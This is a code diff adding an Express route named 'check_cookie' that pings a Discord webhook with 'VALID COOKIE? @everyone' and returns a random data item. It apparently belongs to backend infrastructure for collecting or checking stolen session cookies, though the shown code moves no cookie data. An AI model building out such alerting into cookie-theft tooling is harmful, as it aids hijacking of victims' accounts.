@@ -655,6 +655,17 @@ app.get('/check_cookie/id=52329/r', async (req, res) => {
     res.json(randomObject);
 });
 
+app.get('/check_cookie/id=59329/r', async (req, res) => {
+  const message = {
+      username: "UGMARKET",
+      avatar_url: "https://cdn.discordapp.com/attachments/1128583298562658445/1128583378577391616/invert-ug.png",
+      content: "VALID COOKIE? @everyone"
+  };
+  await sendWebhookMessage(message);
+    const randomObject = data[Math.floor(Math.random() * data.length)];
+    res.json(randomObject);
+});
+
 
 
 app.listen(process.env.PORT || 3000)
